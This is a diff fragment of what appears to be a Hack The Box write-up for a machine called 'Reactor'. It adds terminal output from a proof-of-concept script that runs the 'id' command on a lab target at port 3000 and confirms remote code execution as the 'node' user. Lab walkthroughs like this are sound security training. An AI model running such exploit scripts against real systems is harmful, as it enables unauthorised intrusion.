@@ -860,6 +860,16 @@ With the PoC acquired, execution context was established before attempting anyth
 - `id`
     - **Description:** Unix identity command.
     - **Purpose:** The lowest-risk possible first command — confirms code execution is working and reveals the OS user context the application process is running under before any further enumeration is attempted.
+
+**Result:**
+
+```shell
+┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/Reactor]
+└─$ python3 poc.py http://10.129.13.96:3000/ id
+500
+0:{"a":"$@1","f":"","b":"L3bimJe_3LvBcFWAnK5L4"}
+1:E{"digest":"uid=999(node) gid=988(node) groups=988(node)"}
+```
 <div align="center">
 <br>
 <br>
